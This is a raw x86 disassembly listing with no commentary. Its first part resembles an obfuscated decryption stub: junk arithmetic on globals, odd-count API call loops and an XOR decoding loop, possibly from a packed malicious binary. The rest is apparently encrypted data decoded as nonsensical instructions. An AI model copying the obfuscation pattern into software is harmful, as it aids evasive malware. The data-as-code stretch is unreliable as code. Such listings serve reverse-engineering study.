  415ad3:	jb     0x415a8b
  415ad9:	mov    ecx,0x8a84
  415ade:	and    DWORD PTR ds:0x43001c,0x1a95
  415ae8:	xor    cx,WORD PTR [edi+edx*4+0x2]
  415aed:	mov    edi,0x3b4a
  415af2:	add    cx,di
  415af5:	movzx  ecx,cx
  415af8:	sbb    DWORD PTR ds:0x43101c,0x42e004
  415b02:	mov    DWORD PTR [ebp-0x10],ecx
  415b05:	mov    ecx,DWORD PTR [ebp+0x8]
  415b08:	sub    DWORD PTR ds:0x42f01c,0x430008
  415b12:	movzx  ecx,WORD PTR [ecx+edx*4]
  415b16:	xor    ecx,0x8a84
  415b1c:	adc    DWORD PTR ds:0x431018,0x430010
  415b26:	add    ecx,edi
  415b28:	mov    edi,0x3c3
  415b2d:	mov    edi,DWORD PTR [ebp-0x10]
  415b30:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  415b37:	inc    ecx
  415b38:	inc    edx
  415b39:	mov    ecx,DWORD PTR [ebp-0x18]
  415b3c:	mov    DWORD PTR ds:0x42e024,0x1628
  415b46:	cmp    edx,ecx
  415b48:	mov    DWORD PTR ds:0x42e028,0x1b2a
  415b52:	jne    0x415a7e
  415b58:	add    DWORD PTR ds:0x430018,ebx
  415b5e:	mov    ecx,DWORD PTR [ebp-0x14]
  415b61:	xor    edx,DWORD PTR ds:0x42e010
  415b67:	mov    edx,DWORD PTR [ebp+0x10]
  415b6a:	inc    DWORD PTR ds:0x431004
  415b70:	xor    ecx,eax
  415b72:	add    ecx,esi
  415b74:	sbb    DWORD PTR ds:0x42f004,0x431014
  415b7e:	mov    DWORD PTR [edx],ecx
  415b80:	mov    ecx,DWORD PTR ds:0x43201c
  415b86:	adc    DWORD PTR ds:0x42f008,ecx
  415b8c:	mov    ecx,DWORD PTR [ebp-0x14]
  415b8f:	xor    DWORD PTR ds:0x42f010,0x24f3
  415b99:	xor    ecx,eax
  415b9b:	adc    DWORD PTR ds:0x43200c,0x683
  415ba5:	add    ecx,esi
  415ba7:	mov    DWORD PTR ds:0x430008,0x468a
  415bb1:	mov    DWORD PTR [ebp-0x20],ecx
  415bb4:	mov    DWORD PTR ds:0x42e010,0x51ee
  415bbe:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  415bc5:	mov    DWORD PTR ds:0x42f000,edi
  415bcb:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  415bd2:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  415bd9:	mov    ecx,DWORD PTR [ebp-0xc]
  415bdc:	mov    DWORD PTR [ebp+0x8],ecx
  415bdf:	jmp    0x415d8b
  415be4:	and    DWORD PTR ds:0x432014,0x0
  415bee:	mov    edx,DWORD PTR ds:0x432014
  415bf4:	inc    edx
  415bf5:	mov    DWORD PTR ds:0x432014,edx
  415bfb:	cmp    DWORD PTR ds:0x432014,0x1c
  415c02:	jne    0x415c1f
  415c08:	push   DWORD PTR [ebp-0xc]
  415c0b:	push   DWORD PTR [ebp-0x24]
  415c0e:	push   DWORD PTR [ebp-0xc]
  415c11:	push   0x46b2
  415c16:	push   DWORD PTR [ebp-0x28]
  415c19:	call   DWORD PTR ds:0x42a044
  415c1f:	cmp    DWORD PTR ds:0x432014,0x10
  415c26:	jb     0x415bee
  415c2c:	add    DWORD PTR ds:0x42f010,ebx
  415c32:	mov    ecx,DWORD PTR [ebp+0x8]
  415c35:	mov    edx,DWORD PTR [ebp-0x8]
  415c38:	sbb    DWORD PTR ds:0x432004,0x432014
  415c42:	xor    ecx,eax
  415c44:	xor    edx,eax
  415c46:	sub    ecx,edx
  415c48:	sub    ecx,esi
  415c4a:	xor    ecx,eax
  415c4c:	movzx  edx,WORD PTR ds:0x432018
  415c53:	or     DWORD PTR ds:0x430018,edx
  415c59:	mov    DWORD PTR [ebp+0x8],ecx
  415c5c:	mov    ecx,DWORD PTR [ebp+0x8]
  415c5f:	mov    DWORD PTR ds:0x432000,0x23cd
  415c69:	mov    edx,DWORD PTR [ebp-0x64]
  415c6c:	or     DWORD PTR ds:0x432014,0x431004
  415c76:	lea    ecx,[edx+ecx*1+0x5708f9]
  415c7d:	and    DWORD PTR ds:0x42f010,ebx
  415c83:	mov    DWORD PTR [ebp-0x64],ecx
  415c86:	adc    DWORD PTR ds:0x430018,ecx
  415c8c:	mov    ecx,DWORD PTR [ebp+0x8]
  415c8f:	neg    DWORD PTR ds:0x432014
  415c95:	mov    edx,DWORD PTR [ebp-0x60]
  415c98:	xor    DWORD PTR ds:0x431000,0x43000c
  415ca2:	lea    ecx,[edx+ecx*1+0x5708f9]
  415ca9:	mov    DWORD PTR [ebp-0x60],ecx
  415cac:	mov    ecx,DWORD PTR [ebp+0x8]
  415caf:	mov    edx,DWORD PTR [ebp-0x5c]
  415cb2:	and    DWORD PTR ds:0x42e01c,0x5e6a
  415cbc:	lea    ecx,[edx+ecx*1+0x5708f8]
  415cc3:	adc    DWORD PTR ds:0x431018,0x4b26
  415ccd:	mov    DWORD PTR [ebp-0x5c],ecx
  415cd0:	adc    edx,ecx
  415cd2:	mov    ecx,DWORD PTR [ebp+0x8]
  415cd5:	and    DWORD PTR ds:0x42e01c,0x0
  415cdf:	xor    edx,edx
  415ce1:	or     edx,DWORD PTR ds:0x42e01c
  415ce7:	inc    edx
  415ce8:	mov    DWORD PTR ds:0x42e01c,edx
  415cee:	cmp    DWORD PTR ds:0x42e01c,0x18
  415cf5:	jne    0x415d06
  415cfb:	push   0x169b
  415d00:	call   DWORD PTR ds:0x42a018
  415d06:	cmp    DWORD PTR ds:0x42e01c,0x17
  415d0d:	jb     0x415cdf
  415d13:	mov    edx,DWORD PTR [ebp-0x58]
  415d16:	dec    DWORD PTR ds:0x43100c
  415d1c:	lea    ecx,[edx+ecx*1+0x5708fb]
  415d23:	mov    DWORD PTR [ebp-0x58],ecx
  415d26:	sbb    edx,edx
  415d28:	mov    ecx,DWORD PTR [ebp+0x8]
  415d2b:	sbb    DWORD PTR ds:0x42e020,0x8ae
  415d35:	mov    edx,DWORD PTR [ebp-0x54]
  415d38:	xor    DWORD PTR ds:0x42e014,0x581d
  415d42:	lea    ecx,[edx+ecx*1+0x5708fa]
  415d49:	movzx  edx,BYTE PTR ds:0x43201c
  415d50:	add    edx,DWORD PTR ds:0x42e028
  415d56:	mov    DWORD PTR ds:0x43201c,edx
  415d5c:	mov    DWORD PTR [ebp-0x54],ecx
  415d5f:	add    ecx,ecx
  415d61:	mov    ecx,DWORD PTR [ebp+0x8]
  415d64:	sbb    DWORD PTR ds:0x431004,edi
  415d6a:	mov    edx,DWORD PTR [ebp-0x50]
  415d6d:	and    DWORD PTR ds:0x42e00c,0x45b3
  415d77:	lea    ecx,[edx+ecx*1+0x5708fd]
  415d7e:	add    DWORD PTR ds:0x42f01c,0x430004
  415d88:	mov    DWORD PTR [ebp-0x50],ecx
  415d8b:	sub    DWORD PTR ds:0x42e000,0x6622
  415d95:	mov    ecx,DWORD PTR [ebp+0x8]
  415d98:	sub    DWORD PTR ds:0x42f018,0x42e020
  415da2:	xor    ecx,eax
  415da4:	and    DWORD PTR ds:0x430014,0x42e010
  415dae:	add    ecx,esi
  415db0:	mov    DWORD PTR ds:0x43201c,0x59d8
  415dba:	jne    0x415be4
  415dc0:	mov    DWORD PTR ds:0x430018,0x3258
  415dca:	jmp    0x41a702
  415dcf:	mov    ecx,DWORD PTR [ebp-0x1c]
  415dd2:	sub    DWORD PTR ds:0x432000,edi
  415dd8:	mov    edx,DWORD PTR [ebp-0x8]
  415ddb:	adc    DWORD PTR ds:0x432018,0x42e018
  415de5:	jmp    0x41816f
  415dea:	test   ch,dl
  415dec:	mov    al,0x65
  415dee:	xchg   ecx,eax
  415def:	gs gs aad 0xb1
  415df3:	adc    ebx,ecx
  415df5:	ficom  WORD PTR [eax+0x25]
  415df8:	add    bl,cl
  415dfa:	pop    DWORD PTR [esi+0x61]
  415dfd:	pusha  
  415dfe:	adc    eax,0x2a60605f
  415e03:	mov    ebp,DWORD PTR [ecx]
  415e05:	jns    0x415e36
  415e07:	loop   0x415e6e
  415e09:	ret    0x3ec
  415e0c:	add    eax,0x5be5d70e
  415e11:	mov    cl,0x84
  415e13:	clc    
  415e14:	outs   dx,BYTE PTR ds:[esi]
  415e15:	xor    BYTE PTR [ebp-0x53],cl
  415e18:	push   edx
  415e19:	fcmovnbe st,st(2)
  415e1b:	and    BYTE PTR [ebp+0x50],al
  415e1e:	mov    ds:0xab27c42,eax
  415e23:	mov    edx,0xf4b85b63
  415e28:	arpl   si,cx
  415e2a:	inc    ebp
  415e2b:	repz sahf 
  415e2d:	push   eax
  415e2e:	into   
  415e2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e30:	add    bh,BYTE PTR [ebx+0x3dbe8597]
  415e36:	or     eax,0xa16f383c
  415e3b:	cld    
  415e3c:	push   es
  415e3d:	fild   QWORD PTR ds:0x55cbcb6d
  415e43:	dec    edx
  415e44:	imul   edx,esi,0x56b68329
  415e4a:	jp     0x415dd6
  415e4c:	xor    bh,BYTE PTR [ecx]
  415e4e:	in     eax,0x27
  415e50:	mov    dh,0x89
  415e52:	dec    ecx
  415e53:	jno    0x415e36
  415e55:	clc    
  415e56:	lods   al,BYTE PTR ds:[esi]
  415e57:	(bad)  
  415e58:	lahf   
  415e59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e5a:	lods   eax,DWORD PTR ds:[esi]
  415e5b:	and    eax,0x57d33023
  415e60:	js     0x415e72
  415e62:	xchg   ecx,eax
  415e63:	mov    edi,0x4846b5a4
  415e68:	sbb    al,0x74
  415e6a:	clc    
  415e6b:	cmc    
  415e6c:	call   0x91884a97
  415e71:	mov    ecx,0xbcf3f0ad
  415e76:	ds mov ebp,0xaaf99763
  415e7c:	retf   
  415e7d:	and    dl,BYTE PTR [esi]
  415e7f:	xlat   BYTE PTR ds:[ebx]
  415e80:	ins    DWORD PTR es:[edi],dx
  415e81:	in     al,dx
  415e82:	and    al,0x9f
  415e84:	mov    cl,0x68
  415e86:	jnp    0x415e35
  415e88:	dec    ebx
  415e89:	jmp    0xb7eef2cc
  415e8e:	sbb    al,0x54
  415e90:	loop   0x415ec7
  415e92:	pop    es
  415e93:	loop   0x415e43
  415e95:	jb     0x415ee4
  415e97:	xchg   ebp,eax
  415e98:	cld    
  415e99:	mov    ebx,0x1e742e6b
  415e9e:	(bad)
  415ea2:	inc    ebp
  415ea3:	xchg   ebp,eax
  415ea4:	xchg   BYTE PTR [esi+edx*8],dl
  415ea7:	and    BYTE PTR [edx+0x46b75684],al
  415ead:	mov    ds:0x2db54cd9,eax
  415eb2:	jl     0x415edb
  415eb4:	test   eax,0xf72f297a
  415eb9:	xchg   ebp,eax
  415eba:	mov    al,0x2b
  415ebc:	push   ebp
  415ebd:	(bad)  
  415ebe:	sub    al,0xf7
  415ec0:	sbb    al,0x66
  415ec2:	push   edx
  415ec3:	call   0x9ba98c12
  415ec8:	cmp    DWORD PTR [ebx+0x1df742e2],esi
  415ece:	xchg   edi,eax
  415ecf:	or     dl,0x36
  415ed2:	mov    dh,0xe3
  415ed4:	scas   al,BYTE PTR es:[edi]
  415ed5:	add    ebx,0x266ffbb3
  415edb:	add    al,0xa5
  415edd:	sub    esi,edi
  415edf:	rcr    dl,1
  415ee1:	dec    eax
  415ee2:	scas   eax,DWORD PTR es:[edi]
  415ee3:	mov    al,0x4a
  415ee5:	sahf   
  415ee6:	xchg   esi,eax
  415ee7:	pop    ebx
  415ee8:	or     ebp,DWORD PTR [edi]
  415eea:	inc    ebp
  415eeb:	cli    
  415eec:	loop   0x415ee9
  415eee:	(bad)  [eax+edi*2-0x7b]
  415ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ef3:	enter  0x2991,0xb1
  415ef7:	loop   0x415f34
  415ef9:	jmp    0xed4779d7
  415efe:	out    0x43,al
  415f00:	xchg   BYTE PTR [edx+0x1a],dh
  415f03:	jl     0x415f3a
  415f05:	mov    WORD PTR [ebx+edx*1-0x6],ss
  415f09:	das    
  415f0a:	mov    DWORD PTR [eax+edx*4],ebp
  415f0d:	and    BYTE PTR [edx],cl
  415f0f:	mov    ebp,0x8ea5869d
  415f14:	jl     0x415f92
  415f16:	mov    dl,0xe2
  415f18:	mov    esi,0x2530f2c1
  415f1d:	popa   
  415f1e:	test   eax,0x9bc64f97
  415f23:	inc    ebp
  415f24:	xchg   esp,eax
  415f25:	in     al,0xc0
  415f27:	cli    
  415f28:	div    BYTE PTR [ebx-0x7c]
  415f2b:	retf   
  415f2c:	outs   dx,BYTE PTR ds:[esi]
  415f2d:	cdq    
  415f2e:	mov    esp,0x15cb0102
  415f33:	adc    al,cl
  415f35:	out    dx,eax
  415f36:	pusha  
  415f37:	inc    esi
  415f38:	push   ss
  415f39:	retf   
  415f3a:	test   BYTE PTR [ebp+0x23],bh
  415f3d:	sar    BYTE PTR [esi-0x31],1
  415f40:	iret   
  415f41:	push   ecx
  415f42:	out    0xf0,al
  415f44:	adc    ah,BYTE PTR [edx-0x471fa4ac]
  415f4a:	pop    ss
  415f4b:	das    
  415f4c:	daa    
  415f4d:	inc    esi
  415f4e:	sbb    DWORD PTR [esi],0x15
  415f51:	mov    edx,0xe4648f03
  415f56:	inc    ecx
  415f57:	push   ebx
  415f58:	daa    
  415f59:	mov    DWORD PTR ds:0xb435e77e,esp
  415f5f:	inc    ecx
  415f60:	mov    ecx,0x4c82fb6f
  415f65:	pop    ss
  415f66:	or     BYTE PTR [edi],ch
  415f68:	inc    esi
  415f69:	aam    0xf3
  415f6b:	cld    
  415f6c:	stc    
  415f6d:	mov    esp,0xcdbc49c1
  415f72:	xchg   ecx,eax
  415f73:	cwde   
  415f74:	fsub   st,st(0)
  415f76:	sub    BYTE PTR [edi],bh
  415f78:	js     0x415f0d
  415f7a:	les    edi,FWORD PTR [esi-0x597687d6]
  415f80:	push   ss
  415f81:	addr16 or eax,0x933bc14e
  415f87:	jge    0x415fbb
  415f89:	out    dx,al
  415f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f8b:	inc    ecx
  415f8c:	out    dx,al
  415f8d:	xchg   esi,eax
  415f8e:	daa    
  415f8f:	push   edx
  415f90:	pusha  
  415f91:	sub    BYTE PTR [edx+0x3b],bh
  415f94:	jl     0x415ffd
  415f96:	test   BYTE PTR [eax+0x38],bh
  415f99:	dec    ecx
  415f9a:	xchg   DWORD PTR [ecx+0x63],ebx
  415f9d:	out    0x41,eax
  415f9f:	pop    ebp
  415fa0:	mov    ch,0xb1
  415fa2:	ror    BYTE PTR [ebx-0x70],0xb9
  415fa6:	mov    ah,0x35
  415fa8:	push   esp
  415fa9:	mov    dl,0x78
  415fab:	lds    eax,FWORD PTR [edx]
  415fad:	jmp    0x415fc3
  415faf:	rcr    BYTE PTR [esi],cl
  415fb1:	aas    
  415fb2:	xor    cl,BYTE PTR [ebx+ecx*4+0x5a]
  415fb6:	rol    esp,cl
  415fb8:	xchg   DWORD PTR [esi],ebp
  415fba:	sbb    ebp,DWORD PTR [ebp+0x43f4194b]
  415fc0:	or     al,0xb7
  415fc2:	sbb    ah,BYTE PTR [ebp+0x2c]
  415fc5:	sbb    DWORD PTR [eax-0x38],ebx
  415fc8:	dec    eax
  415fc9:	mov    edi,0xd449a39f
  415fce:	cld    
  415fcf:	adc    ecx,DWORD PTR [esp+edx*2-0x2981ecf5]
  415fd6:	xor    ebx,DWORD PTR [ebp+0x4cc1b694]
  415fdc:	repnz xor cl,BYTE PTR [ebx+ebp*2+0x2f50b4c3]
  415fe4:	dec    dl
  415fe6:	outs   dx,DWORD PTR ds:[esi]
  415fe7:	mov    ds:0xd9acb086,al
  415fec:	mov    WORD PTR [ecx+0x1f1ade73],?
  415ff2:	lds    ebx,FWORD PTR [ecx+0x12]
  415ff5:	outs   dx,DWORD PTR ds:[esi]
  415ff6:	xchg   ebp,eax
  415ff7:	xchg   ebp,ebp
  415ff9:	pop    eax
  415ffa:	mov    ds:0x9da959c,eax
  415fff:	xor    BYTE PTR [ebp+0x65],0x38
  416003:	int3   
  416004:	jne    0x416003
  416006:	jbe    0x416038
  416008:	cli    
  416009:	jnp    0x416011
  41600b:	push   esi
  41600c:	(bad)  
  41600d:	test   al,0x77
  41600f:	mov    dl,0x55
  416011:	lea    eax,[ebp+0x29b7df4b]
  416017:	mov    BYTE PTR ds:0xd3e8b533,dh
  41601d:	inc    ebp
  41601e:	repz adc DWORD PTR [ebp+0x768f29df],edx
  416025:	out    0x3b,al
  416027:	popa   
  416028:	(bad)  
  416029:	in     al,dx
  41602a:	fld    DWORD PTR [edx+eiz*8+0x131745fc]
  416031:	jns    0x416009
  416033:	fwait
  416034:	dec    esp
  416035:	hlt    
  416036:	mov    esi,0x6fcb380b
  41603b:	hlt    
  41603c:	aam    0x6f
  41603e:	cmp    dl,dl
  416040:	clc    
  416041:	int3   
  416042:	call   FWORD PTR [edx+0x35]
  416045:	nop
  416046:	sbb    dh,BYTE PTR [edx+0x3b15cec]
  41604c:	ins    DWORD PTR es:[edi],dx
  41604d:	pop    edx
  41604e:	pop    ebx
  41604f:	jae    0x416024
  416051:	cld    
  416052:	(bad)  
  416053:	and    al,0xda
  416055:	imul   edx,DWORD PTR [esi],0x4
  416058:	jno    0x416026
  41605a:	or     ebx,DWORD PTR ds:0x8153a050
  416060:	int3   
  416061:	sub    eax,0x3099fcad
  416066:	push   ds
  416067:	shl    DWORD PTR [esi+0x4535d789],cl
  41606d:	sub    ecx,DWORD PTR [ebx+esi*4+0x54450e0f]
  416074:	mov    dh,0x3d
  416076:	or     eax,0x49b8b40a
  41607b:	mov    al,ds:0x36e0ec7a
  416080:	(bad)  
  416081:	fcomp  DWORD PTR [ecx]
  416083:	bound  esi,QWORD PTR [eax+edi*1-0x79]
  416087:	rcr    BYTE PTR [ecx-0x11],0x82
  41608b:	repz sbb eax,edi
  41608e:	dec    esp
  41608f:	enterw 0xe218,0x87
  416094:	xor    dl,BYTE PTR [eax-0x46303ec6]
  41609a:	popf   
  41609b:	popa   
  41609c:	mov    al,0x1a
  41609e:	mov    bl,0xdc
  4160a0:	cmp    eax,0xaddf83c8
  4160a5:	mov    al,0xca
  4160a7:	aam    0x17
  4160a9:	retf   0x7e10
  4160ac:	cld    
  4160ad:	icebp  
  4160ae:	fldenv [esi+ebp*4-0x18168091]
  4160b5:	mov    ch,0x1
  4160b7:	push   edx
  4160b8:	mov    al,0x3
  4160ba:	adc    ch,ch
  4160bc:	adc    ah,BYTE PTR [edx-0x4b]
  4160bf:	loope  0x4160e4
  4160c1:	cs add eax,0xec884e8d
  4160c7:	add    al,0x15
  4160c9:	and    esp,DWORD PTR [edi]
  4160cb:	pop    ebp
  4160cc:	fwait
  4160cd:	xor    eax,0x23b0a2a7
  4160d2:	sub    al,0x79
  4160d4:	jo     0x41607f
  4160d6:	imul   esp,ebp,0x2b2e38e9
  4160dc:	sbb    cl,BYTE PTR [esi+eiz*4-0x50]
  4160e0:	(bad)  
  4160e1:	pushf  
  4160e2:	adc    BYTE PTR [edi+edx*4],cl
  4160e5:	sbb    eax,DWORD PTR [edx]
  4160e7:	test   DWORD PTR [esi-0x54],ecx
  4160ea:	out    dx,eax
  4160eb:	jnp    0x41614e
  4160ed:	or     BYTE PTR [eax],bh
  4160ef:	leave  
  4160f0:	(bad)  
  4160f1:	mov    ebp,0xc10f2b78
  4160f6:	lea    ebp,[ebx]
  4160f8:	stos   BYTE PTR es:[edi],al
  4160f9:	scas   eax,DWORD PTR es:[edi]
  4160fa:	int    0xff
  4160fc:	adc    al,0x43
  4160fe:	mov    dl,0x90
  416100:	outs   dx,DWORD PTR ds:[esi]
  416101:	jae    0x4160a6
  416103:	(bad)  
  416104:	fdiv   DWORD PTR [ebx+0x3a]
  416107:	aaa    
  416108:	imul   ebx,DWORD PTR fs:[esi-0x67],0xffffff89
  41610d:	add    DWORD PTR [esi-0x7fddbc0d],edx
  416113:	add    eax,0xec0e3e85
  416118:	jge    0x4160cf
  41611a:	adc    dh,dh
  41611c:	pop    ss
  41611d:	(bad)  
  41611e:	xor    DWORD PTR [esi+0x3d],ebx
  416121:	in     al,dx
  416122:	int    0xf8
  416124:	(bad)  
  416125:	xor    al,cl
  416127:	outs   dx,BYTE PTR ds:[esi]
  416128:	cld    
  416129:	or     DWORD PTR [eax+0x1b75002d],esi
  41612f:	inc    ebx
  416130:	mov    esp,DWORD PTR [eax+0x45]
  416133:	stos   BYTE PTR es:[edi],al
  416134:	sbb    eax,0x3cf94e75
  416139:	add    cl,BYTE PTR cs:[esi-0x6ee4c77]
  416140:	lock xchg BYTE PTR [ecx+0x23],dh
  416144:	mov    DWORD PTR [ebp-0x22],edi
  416147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416148:	jae    0x416112
  41614a:	cli    
  41614b:	lds    eax,FWORD PTR [edx+0x4d]
  41614e:	pop    ds
  41614f:	pop    esp
  416150:	mov    bl,0x67
  416152:	in     al,dx
  416153:	fnstsw ax
  416155:	xor    al,0x3a
  416157:	add    BYTE PTR [esi],0xb2
  41615a:	js     0x41619a
  41615c:	loopne 0x416173
  41615e:	push   eax
  41615f:	sahf   
  416160:	pushf  
  416161:	(bad)  
  416162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416163:	add    esp,eax
  416165:	ins    DWORD PTR es:[edi],dx
  416166:	pop    eax
  416167:	pop    eax
  416168:	jb     0x416185
  41616a:	cmp    al,0x6d
  41616c:	xchg   BYTE PTR [esi],dh
  41616e:	mov    ebp,0x9d3b5a4e
  416173:	sub    DWORD PTR [ebx],ecx
  416175:	ret    0x51b3
  416178:	fwait
  416179:	out    0xa2,al
  41617b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41617c:	jge    0x416184
  41617e:	mov    WORD PTR [ebp-0x6f21919],?
  416184:	cmp    esi,esp
  416186:	into   
  416187:	mov    ds:0xd4f260fd,eax
  41618c:	test   eax,0x412fc66b
  416191:	stos   DWORD PTR es:[edi],eax
  416192:	in     al,0x5c
  416194:	hlt    
  416195:	js     0xe0b6a617
  41619b:	out    0xf6,al
  41619d:	push   ebx
  41619e:	mov    ebx,0x5855ee1f
  4161a3:	dec    ecx
  4161a4:	pop    edi
  4161a5:	mov    al,ds:0x13a84645
  4161aa:	(bad)  
  4161ab:	dec    ecx
  4161ad:	mov    BYTE PTR [eax],bl
  4161af:	lahf   
  4161b0:	push   ds
  4161b1:	push   esp
  4161b2:	jg     0x416173
  4161b4:	mov    bh,0x34
  4161b6:	push   edx
  4161b7:	sar    edx,cl
  4161b9:	test   eax,0xaa74a215
  4161be:	sub    eax,0x5bf33a55
  4161c3:	dec    eax
  4161c4:	outs   dx,BYTE PTR ds:[si]
  4161c6:	sar    esi,1
  4161c8:	loopne 0x416222
  4161ca:	lock xchg ecx,eax
  4161cc:	into   
  4161cd:	dec    edi
  4161ce:	and    eax,0x35d1ff3c
  4161d3:	sub    eax,0xcfbc3dd8
  4161d8:	pop    esi
  4161d9:	xor    DWORD PTR [ebp+0x3b],edi
  4161dc:	push   esp
  4161dd:	adc    edi,ecx
  4161df:	ja     0x416254
  4161e1:	adc    al,0x2c
  4161e3:	and    BYTE PTR [ecx],ah
  4161e5:	mov    ds:0x175fd600,eax
  4161ea:	sbb    eax,0x8d7c2523
  4161ef:	mov    ebx,0xaadbd033
  4161f4:	das    
  4161f5:	xchg   ebp,eax
  4161f6:	jne    0x41623d
  4161f8:	les    edx,FWORD PTR [esi]
  4161fa:	jbe    0x4161ae
  4161fc:	out    0xf0,al
  4161fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161ff:	jmp    0x416250
  416201:	std    
  416202:	int    0x2b
  416204:	rcr    DWORD PTR [edx+0x426ecabc],0xcb
  41620b:	push   ebx
  41620c:	cmc    
  41620d:	xor    ch,bh
  41620f:	jle    0x4161e4
  416211:	xlat   BYTE PTR ds:[ebx]
  416212:	inc    ebx
  416213:	arpl   di,bx
  416215:	mov    edi,0x10e5233b
  41621a:	jnp    0x4161ad
  41621c:	mov    cl,0xaa
  41621e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41621f:	call   0xb7af:0x2edae57
  416226:	movntps XMMWORD PTR [eax+esi*1+0x76],xmm2
  41622b:	push   edx
  41622c:	into   
  41622d:	xchg   esi,eax
  41622e:	and    cl,BYTE PTR [ebp+0x5e133ee4]
  416234:	retf   0x17a9
  416237:	jle    0x41627e
  416239:	jle    0x416241
  41623b:	ss mov esi,0x31d93a2c
  416241:	and    ecx,esi
  416243:	pop    ds
  416244:	pop    edx
  416245:	dec    ebp
  416246:	cmp    eax,0x3fbc2aab
  41624b:	cmp    eax,0xf40ac2e2
  416250:	or     eax,0x8006473f
  416255:	test   BYTE PTR [edx+0x43],0xb9
  416259:	es dec edi
  41625b:	mov    bl,0x0
  41625d:	mov    ds:0x9229dd87,eax
  416262:	aas    
  416263:	adc    BYTE PTR [ebp+ebp*1+0x39b69af6],dh
  41626a:	jne    0x416274
  41626c:	outs   dx,DWORD PTR ds:[esi]
  41626d:	sub    al,0xab
  41626f:	call   0x7b10:0xcda4e505
  416276:	test   DWORD PTR [eax+0x54f3fbf8],edx
  41627c:	mov    cl,0x2
  41627e:	pusha  
  41627f:	fwait
  416280:	mov    al,0x6c
  416282:	mov    ebx,0x2e60f0a2
  416287:	ret    0x7fd1
  41628a:	shl    BYTE PTR [ecx-0xd],1
  41628d:	jle    0x41628c
  41628f:	jnp    0x41625e
  416291:	xlat   BYTE PTR cs:[ebx]
  416293:	sar    DWORD PTR ss:[esi-0x5eb142a5],cl
  41629a:	(bad)
  41629d:	shl    DWORD PTR [ecx+edx*1-0x572ef4f7],1
  4162a4:	push   ecx
  4162a5:	mov    edi,0xf004324e
  4162aa:	ud2    
  4162ac:	cwde   
  4162ad:	push   si
  4162af:	sar    BYTE PTR [ebp+0x8be0162],1
  4162b5:	in     al,0x30
  4162b7:	dec    ebx
  4162b8:	inc    edi
  4162b9:	mov    DWORD PTR [ebx+0x49],ecx
  4162bc:	leave  
  4162bd:	lods   al,BYTE PTR ds:[esi]
  4162be:	repnz mov esi,0xf0592013
  4162c4:	mov    ecx,0x6d4e5c5
  4162c9:	push   eax
  4162ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162cb:	sub    BYTE PTR [edx-0x4f],dh
  4162ce:	or     BYTE PTR [ecx-0x13a8b3eb],0x93
  4162d5:	sbb    bh,BYTE PTR [ecx-0x13ace552]
  4162db:	shl    DWORD PTR [edx+0xe],1
  4162de:	ja     0x416294
  4162e0:	push   ds
  4162e1:	stc    
  4162e2:	mov    ds:0x2506e326,al
  4162e7:	push   ecx
  4162e8:	push   esi
  4162e9:	outs   dx,BYTE PTR ds:[esi]
  4162ea:	push   ds
  4162eb:	pop    esi
  4162ec:	fcmovnu st,st(6)
  4162ee:	xor    DWORD PTR [ebx+0x5203bca4],0xffffffff
  4162f5:	cdq    
  4162f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162f7:	call   eax
  4162f9:	fsubrp st(3),st
  4162fb:	cmp    ecx,DWORD PTR [ecx+eax*4]
  4162fe:	(bad)  [ecx]
  416300:	xor    BYTE PTR [ebx+eax*1],0xe0
  416304:	stc    
  416305:	or     esi,esi
  416307:	mov    dl,dl
  416309:	js     0x4162ad
  41630b:	inc    esi
  41630c:	jne    0x416303
  41630e:	push   esi
  41630f:	fdiv   QWORD PTR [edx+0x4dd83b2f]
  416315:	add    ah,BYTE PTR [eax-0x231c8f65]
  41631b:	leave  
  41631c:	loopne 0x416379
  41631e:	jno    0x4162d6
  416320:	ret    
  416321:	add    eax,DWORD PTR [ebx]
  416323:	or     DWORD PTR [eax],esi
  416325:	add    eax,0xc3ca6d51
  41632a:	sub    esi,DWORD PTR [ebp+0x54f079fc]
  416330:	jmp    0x2121ba5b
  416335:	outs   dx,DWORD PTR ds:[esi]
  416336:	dec    eax
  416337:	int    0x5c
  416339:	xchg   ebp,eax
  41633a:	loopne 0x4162d2
  41633c:	scas   al,BYTE PTR es:[edi]
  41633d:	int    0x74
  41633f:	scas   al,BYTE PTR es:[edi]
  416340:	loope  0x416385
  416342:	sub    ecx,DWORD PTR [ebx-0x7d52a918]
  416348:	xor    DWORD PTR cs:[ecx],esp
  41634b:	xchg   edx,eax
  41634c:	and    BYTE PTR [esi],ch
  41634e:	jae    0x41631b
  416350:	outs   dx,DWORD PTR ds:[esi]
  416351:	in     al,dx
  416352:	push   ds
  416353:	mov    ecx,0x512b1c52
  416358:	ins    DWORD PTR es:[edi],dx
  416359:	mov    cs,WORD PTR [esp+ecx*1-0x30]
  41635d:	mov    al,ds:0x3da86192
  416362:	retf   0x55ef
  416365:	jg     0x4163d8
  416367:	jp     0x4163a4
  416369:	je     0x4163e6
  41636b:	fistp  QWORD PTR [ebx-0x72]
  41636e:	icebp  
  41636f:	dec    eax
  416370:	jb     0x416385
  416372:	fist   DWORD PTR [edx]
  416374:	rol    BYTE PTR [edi+0x40],cl
  416377:	mov    ebp,0x47dce65c
  41637c:	loop   0x4163ee
  41637e:	test   eax,0x180ca579
  416383:	sar    BYTE PTR [esi],1
  416385:	aas    
  416386:	pop    es
  416387:	ja     0x4163eb
  416389:	les    edx,FWORD PTR [ebx+0x695d03e9]
  41638f:	gs mov ebp,0x680cf569
  416395:	dec    esp
  416396:	or     BYTE PTR [edx],ch
  416398:	mov    ah,0x6a
  41639a:	inc    ecx
  41639b:	scas   al,BYTE PTR es:[edi]
  41639c:	or     DWORD PTR [eax-0x7a78af63],0xf91bed30
  4163a6:	fimul  WORD PTR [ebx-0x6be5c2f]
